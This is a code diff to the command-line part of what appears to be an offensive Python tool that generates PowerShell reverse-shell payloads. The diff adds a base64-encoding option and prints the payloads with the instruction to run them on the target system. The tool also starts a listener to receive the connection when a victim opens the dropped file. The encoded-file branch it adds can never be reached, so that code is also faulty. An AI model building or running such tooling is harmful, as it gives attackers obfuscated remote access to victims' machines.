@@ -44,20 +44,32 @@ while True:
     parser.add_argument("-OUTFILE", "--output", help="Output file name")
     parser.add_argument("-CONNECT", "--connect", action="store_true", help="Connects with the target if the target opens the file")
     parser.add_argument("-IP", "--ip", help="Specify the IP address of the target")
+    parser.add_argument("-ENCODED", "--encoded", action="store_true", help="generates payload in base64")
 
     args = parser.parse_args(dracula_cm)
-    powershell_script = main.generate_payload_ps(args.ip, args.port, args.output)
+    powershell_script_batch = main.generate_payload_ps(args.ip, args.port, args.output)
+    powershell_script_batch_encoded = main.generate_payload_ps_encoded(args.ip, args.port, args.output)
+    powershell_script = main.generate_payload_ps_text(args.ip, args.port)
+    powershell_script_encoded = main.generate_payload_ps_text_encoded(args.ip, args.port)
+
     try:
         if args.ip and args.port and args.output:
             with open(args.output, "w") as f:
-                f.write(powershell_script)
+                f.write(powershell_script_batch)
                 print(f"\n{GREEN}SUCCESS!!! {RESET}CREATED {args.output} ")
+        elif args.ip and args.port and args.output and args.encoded:
+            with open(args.output, "w") as f:
+                f.write(powershell_script_batch_encoded)
+                print(f"\n{GREEN}SUCCESS!!! {RESET}CREATED {args.output} ")
+        elif args.ip and args.port and args.encoded:
+            print("ENCODED PAYLOAD GENERATED, RUN ON TARGET SYSTEM: ")
+            print(f"\n{GREEN} {powershell_script_encoded}")
         elif args.ip and args.port:
             print("PAYLOAD GENERATED, RUN ON TARGET SYSTEM: ")
-            print(powershell_script)
+            print(f"\n{GREEN} {powershell_script}")
     except Exception as e:
         print(f"{RED}An error occurred: {e}{RESET}")
 
     if args.connect and args.port and args.ip:
-        print(f"Starting listener on {args.ip}:{args.port}...")
+        print(f"{BV}Starting listener on {args.ip}:{args.port}...")
         main.listener(args.ip, args.port)
